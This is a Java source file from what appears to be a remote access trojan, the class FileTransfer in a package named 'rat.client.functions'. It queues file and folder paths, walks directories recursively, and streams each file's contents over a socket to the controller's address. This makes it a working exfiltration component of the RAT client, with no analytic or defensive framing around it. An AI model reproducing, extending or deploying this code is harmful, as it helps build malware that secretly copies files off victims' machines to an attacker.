package rat.client.functions;

import org.jboss.netty.channel.Channel;
import rat.packets.FileDataPacket;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

public class FileTransfer extends Thread {

    private volatile boolean active;

    BlockingQueue<FileTransferInfo> queue = new LinkedBlockingQueue<>();

    private Channel channel;
    private int transferPort;

    public FileTransfer(Channel channel, int transferPort) {
        super();
        this.channel = channel;
        this.transferPort = transferPort;
    }

    @Override
    public void run() {
        this.active = true;

        while (isActive()) {
            FileTransferInfo info;
            try {
                info = queue.take();
            } catch (InterruptedException e) {
                e.printStackTrace();
                this.active = false;
                return;
            }

            if (info.getPath() == null && info.getParentFolder() == null) {
                // poison pill
                this.active = false;
                return;
            }

            File file = new File(info.getPath());
            if (!file.exists()) {
                return;
            }

            if (file.isDirectory()) {
                downloadFolder(info.getPath(), info.getParentFolder());
            } else {
                downloadFile(info.getPath(), info.getParentFolder());
            }
        }
    }

    public boolean isActive() {
        return active;
    }

    private void downloadFolder(String folderPath, String parentFolder) {
        try {
            Path start = Paths.get(folderPath);
            Files.walkFileTree(start, new SimpleFileVisitor<Path>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    downloadFile(file.toFile().getAbsolutePath(), parentFolder);
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void downloadFile(String filePath, String parentFolder) {
        if (!active) {
            return;
        }

        Path file = Paths.get(filePath);
        Path folder = Paths.get(parentFolder);
        String relative = folder.relativize(file).toString();

        long totLen = file.toFile().length();

        byte[] bytes = new byte[4096];

        InetSocketAddress address = (InetSocketAddress) channel.getRemoteAddress();
        try (Socket socket = new Socket(address.getAddress(), transferPort)) {

            /* Send FileDataPacket */
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            oos.writeObject(new FileDataPacket(relative, totLen));

            OutputStream out = socket.getOutputStream();
            File f = file.toFile();
            InputStream in = new FileInputStream(f);

            int count;
            while ((count = in.read(bytes)) > 0 && active) {
                out.write(bytes, 0, count);
            }

            out.close();

        } catch (IOException ex) {
            ex.printStackTrace();
        }

        System.out.println("File written!");
    }

    public void finish() {
        queue.add(new FileTransferInfo(null, null));
        active = false;
        System.out.println("Download stopped");
    }

    public void addDownloadTask(String path, String parentFolder) {
        System.out.println("Adding to queue: " + path + " parent folder: " + parentFolder);
        queue.add(new FileTransferInfo(path, parentFolder));
    }

    private static class FileTransferInfo {

        private String path;
        private String parentFolder;

        public FileTransferInfo(String path, String parentFolder) {
            this.path = path;
            this.parentFolder = parentFolder;
        }

        public String getPath() {
            return path;
        }

        public String getParentFolder() {
            return parentFolder;
        }
    }
}
